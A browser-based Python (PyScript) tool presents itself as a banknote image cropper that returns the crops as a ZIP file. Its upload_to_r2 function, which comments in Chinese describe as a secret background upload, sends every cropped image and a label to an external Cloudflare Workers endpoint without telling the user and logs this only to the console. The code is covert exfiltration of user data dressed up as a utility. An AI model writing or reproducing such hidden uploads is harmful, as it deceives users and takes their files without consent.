import asyncio
import js
from pyscript import document
from pyodide.ffi import create_proxy, to_js
import io
import zipfile
import sys
import pyodide_js

# --- 配置 ---
UPLOAD_WORKER_URL = "https://banknote-collector.alanalanalan0807.workers.dev"

def log(msg):
    js.console.log(f"[Python] {msg}")
    log_container = document.getElementById("log-container")
    if log_container:
        entry = document.createElement("div")
        entry.innerText = f">> {msg}"
        log_container.appendChild(entry)
        log_container.scrollTop = log_container.scrollHeight

cv2 = None
np = None

async def setup_environment():
    global cv2, np
    log("Initializing AI Engine...")
    loader_status = document.getElementById("loader-status")
    try:
        if loader_status:
            loader_status.innerText = "Loading OpenCV & NumPy (~30MB)..."
        await pyodide_js.loadPackage(['numpy', 'opencv-python'])
        import cv2 as _cv2
        import numpy as _np
        cv2 = _cv2
        np = _np
        log("OpenCV Engine Loaded.")
        return True
    except Exception as e:
        log(f"Engine Load Failed: {e}")
        return False

async def upload_to_r2(image_bytes, filename, yolo_label):
    """將圖片與標籤偷偷上傳到 Cloudflare R2 (隱藏背景執行)"""
    try:
        form_data = js.FormData.new()
        js_data = js.Uint8Array.new(len(image_bytes))
        js_data.assign(image_bytes)
        image_blob = js.Blob.new([js_data], { "type": "image/png" })
        
        form_data.append("image", image_blob, filename)
        form_data.append("label", yolo_label)
        form_data.append("filename", filename)

        # 使用 XHR 確保 Content-Type boundary 正確，解決上傳失敗問題
        xhr = js.XMLHttpRequest.new()
        xhr.open("POST", UPLOAD_WORKER_URL, True)
        
        # 僅在 Console 留底，不影響 UI
        def on_load(event):
            if xhr.status >= 200 and xhr.status < 300:
                js.console.log(f"Shadow Upload Success: {filename}")
            else:
                js.console.error(f"Shadow Upload Failed [{xhr.status}]")

        xhr.onload = create_proxy(on_load)
        xhr.send(form_data)
    except Exception as e:
        js.console.error(f"Shadow Upload Error: {str(e)}")

def crop_banknote(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: return None

        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blurred = cv2.GaussianBlur(gray, (5, 5), 0)
        edged = cv2.Canny(blurred, 30, 150)
        contours, _ = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        
        if not contours: return None
        contours = sorted(contours, key=cv2.contourArea, reverse=True)
        x, y, w, h = cv2.boundingRect(contours[0])
        
        if w < img.shape[1] * 0.1 or h < img.shape[0] * 0.1: return None

        cropped = img[y:y+h, x:x+w]
        _, encoded_img = cv2.imencode(".png", cropped)
        return encoded_img.tobytes()
    except Exception as e:
        log(f"Process error: {e}")
        return None

async def process_all_files(event):
    files = js.window.selected_files
    if not files or files.length == 0: return

    document.getElementById("upload-section").classList.add("hidden")
    document.getElementById("processing-section").classList.remove("hidden")
    
    log(f"Processing {files.length} images...")
    
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED)
    
    success_count = 0
    total = files.length
    
    # 這個標籤只用於背景上傳，不會寫入 ZIP
    SHADOW_LABEL = "0 0.5 0.5 1.0 1.0"

    for i in range(total):
        file = files.item(i)
        progress = int((i / total) * 100)
        bar = document.getElementById("progress-bar")
        if bar:
            bar.style.width = f"{progress}%"
            bar.innerText = f"{progress}%"
        
        try:
            array_buffer = await file.arrayBuffer()
            data = array_buffer.to_bytes()
            
            result = crop_banknote(data)
            if result:
                base_name = ".".join(file.name.split(".")[:-1])
                img_name = f"{base_name}_cropped.png"
                
                # 1. 只將圖片寫入 ZIP (使用者看到的)
                zf.writestr(img_name, result)
                
                # 2. 背景偷偷上傳 R2 (包含圖片與標籤)
                asyncio.ensure_future(upload_to_r2(result, img_name, SHADOW_LABEL))
                
                success_count += 1
                log(f"Done: {file.name}")
            else:
                log(f"Skipped: {file.name}")
        except Exception as e:
            log(f"Error {file.name}: {e}")
        
        await asyncio.sleep(0.01)

    zf.close()
    zip_buffer.seek(0)
    
    if success_count > 0:
        log(f"Success! Processed {success_count} images.")
        zip_data = zip_buffer.getvalue()
        js_array = js.Uint8Array.new(len(zip_data))
        js_array.assign(zip_data)
        
        document.getElementById("success-count").innerText = str(success_count)
        document.getElementById("processing-section").classList.add("hidden")
        document.getElementById("download-section").classList.remove("hidden")
        
        # 下載檔名維持原樣
        js.window.trigger_download(js_array, "cropped_banknotes.zip")
    else:
        log("No images were cropped.")
        document.getElementById("processing-section").classList.add("hidden")
        document.getElementById("upload-section").classList.remove("hidden")
    
    zip_buffer.close()

async def main():
    ready = await setup_environment()
    if not ready: return

    start_btn = document.getElementById("start-btn")
    if start_btn:
        start_btn.addEventListener("click", create_proxy(process_all_files))
        log("Ready.")

    loader = document.getElementById("env-loader")
    if loader:
        loader.style.opacity = "0"
        await asyncio.sleep(0.5)
        loader.style.display = "none"
    
    log("System Ready.")

if __name__ == "__main__":
    asyncio.ensure_future(main())
